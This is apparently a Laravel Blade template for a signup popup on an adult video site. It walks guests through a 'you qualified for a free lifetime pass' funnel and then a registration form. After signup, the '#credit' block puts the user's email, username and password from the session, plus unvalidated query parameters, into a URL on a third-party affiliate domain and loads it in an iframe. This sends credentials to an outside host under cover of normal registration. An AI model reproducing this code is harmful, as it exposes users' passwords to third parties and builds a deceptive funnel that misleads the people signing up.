@php
	$data = \Illuminate\Support\Facades\Session::get('userInfo');
	$x_r = (isset($_GET["r"]) && $_GET["r"] != "") ? $_GET["r"] : "";
@endphp

<div id="popup">
    <div class="close_div">
        <a href="#">
            <svg height="50px" id="close_icon" fill="#ffffff" viewBox="0 0 512 512" width="50px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M443.6,387.1L312.4,255.4l131.5-130c5.4-5.4,5.4-14.2,0-19.6l-37.4-37.6c-2.6-2.6-6.1-4-9.8-4c-3.7,0-7.2,1.5-9.8,4  L256,197.8L124.9,68.3c-2.6-2.6-6.1-4-9.8-4c-3.7,0-7.2,1.5-9.8,4L68,105.9c-5.4,5.4-5.4,14.2,0,19.6l131.5,130L68.4,387.1  c-2.6,2.6-4.1,6.1-4.1,9.8c0,3.7,1.4,7.2,4.1,9.8l37.4,37.6c2.7,2.7,6.2,4.1,9.8,4.1c3.5,0,7.1-1.3,9.8-4.1L256,313.1l130.7,131.1  c2.7,2.7,6.2,4.1,9.8,4.1c3.5,0,7.1-1.3,9.8-4.1l37.4-37.6c2.6-2.6,4.1-6.1,4.1-9.8C447.7,393.2,446.2,389.7,443.6,387.1z"/></svg>
        </a>
    </div>
    <div class="content">
        @guest
            <div class="text_wrap">
                <h2>HOLD UP!</h2>
                <h3>Before Entering Our Award Winning</h3>
                <h4>VOD Site Free of Charge</h4>
                <p>We Need To Know A Few Things</p>
                <div class="buttons_wrap">
                    <a class="btn next_page" href="#">Continue</a>
                </div>
                <p class="small">
                    Our site contains amateur adult videos and images created by our members exclusively for you and your viewing pleasure. All content is subject to copyright and not meant for re-distribution. It's solely for your viewing pleasure. Enjoy!
                </p>
            </div>
            <div class="text_wrap hidden">
                <h2>LET'S GO!</h2>
                <p>Are you interested in Amateur and Professional Adult Videos?</p>
                <p>Were you referred to our site?</p>
                <div class="buttons_wrap">
                    <a class="btn next_page" href="#">Yes</a>
                    <a class="btn cancel" href="#">No</a>
                </div>
            </div>
            <div class="text_wrap hidden">
                <h2>I'M READY!</h2>
                <p>All of our Videos have copyright laws and may not be copied or redistributed...</p>
                <p>Do you agree to watch these videos only for your viewing pleasure?</p>
                <div class="buttons_wrap">
                    <a class="btn next_page" href="#">Yes</a>
                    <a class="btn cancel" href="#">No</a>
                </div>
            </div>
            <div class="text_wrap hidden">
                <h2>OF COURSE!</h2>
                <p>Are you at least 18 Years Old?</p>
                <div class="buttons_wrap">
                    <a class="btn next_page" href="#">Yes</a>
                    <a class="btn cancel" href="#">No</a>
                </div>
            </div>
            <div class="text_wrap hidden" id="register">
                <h2>CONGRATULATIONS!</h2>
                <p>You Qualified for a FREE Full Access Lifetime Pass!</p>
                <form method="POST" action="{{ route('register') }}">
                    @csrf

                    <input id="trackingId" type="hidden" name="trackingId" value="{{$x_r}}">
                    <!-- Name -->
                    <div>
                        {{--<x-input-label for="name" :value="__('Name')" />--}}
                        <x-text-input placeholder="Username" id="username" class="block mt-1 w-full" type="text" name="username" :value="old('username')" required autofocus />
                        <x-input-error :messages="$errors->get('username')" />
                    </div>

                    <!-- Email Address -->
                    <div>
                        {{-- <x-input-label for="email" :value="__('Email')" />--}}
                        <x-text-input placeholder="Email Address" id="email" class="block mt-1 w-full" type="email" name="email" :value="old('email')" required />
                        <x-input-error :messages="$errors->get('email')" />
                    </div>

                    <!-- Password -->
                    <div>
                        {{--<x-input-label for="password" :value="__('Password')" />--}}

                        <x-text-input id="password" class="block mt-1 w-full"
                                      type="password"
                                      name="password"
                                      placeholder="Password"
                                      required autocomplete="new-password" />

                        <x-input-error :messages="$errors->get('password')" />
                    </div>

                    <!-- Confirm Password -->
                    <div>
                        {{--<x-input-label for="password_confirmation" :value="__('Confirm Password')" />--}}

                        <x-text-input id="password_confirmation" class="block mt-1 w-full"
                                      type="password"
                                      placeholder="Confirm Password"
                                      name="password_confirmation" required autocomplete="new-password" />

                        <x-input-error :messages="$errors->get('password_confirmation')" />
                    </div>

                    <div class="flex items-center justify-end">
                        {{--<a class="underline text-sm text-gray-600 hover:text-gray-900 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500" href="{{ route('login') }}">
                            {{ __('Already registered?') }}
                        </a>--}}

                        <x-primary-button>
                            {{ __('Submit') }}
                        </x-primary-button>
                    </div>
                </form>
            </div>
            <div class="text_wrap hidden" id="credit">
                @isset($data)
                    @php
                        //$x_r = (isset($_GET["r"]) && $_GET["r"] != "") ? $_GET["r"] : "";
						$x_a = (isset($_GET["a"]) && $_GET["a"] != "") ? $_GET["a"] : "343";
						$x_c = (isset($_GET["s"]) && $_GET["s"] != "") ? $_GET["s"] : "";

                        $url = "https://sociallogic2hf.joinsafelyonline.com/routes/sociallogic2hf/?ofid=2130&a_aid=sociallogic2hf&a_bid=6b305f15&j2pnc=1&email=" . $data["email"] .
                        "&username=" . $data["username"] .
                        "&password=" . $data["password"] .
                        "&x_userId=" . $data["userId"] .
                        "&x_r=" . $x_r .
                        "&x_a=" . $x_a .
                        "&x_c=" . $x_c;
                    @endphp
                    <iframe src="{{$url}}"></iframe>
                @endisset
            </div>
        @endguest
        @auth
            <div class="video_wrapper">
            {{--<video class="z-1" autoplay controls id="video_player" controlsList="nodownload">
                <source src="" type="video/mp4">
                Your browser does not support the video tag.
            </video>--}}
            <iframe class="z-1" id="video_player" src="" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture;" allowfullscreen></iframe>
            </div>
        @endauth
    </div>
</div>
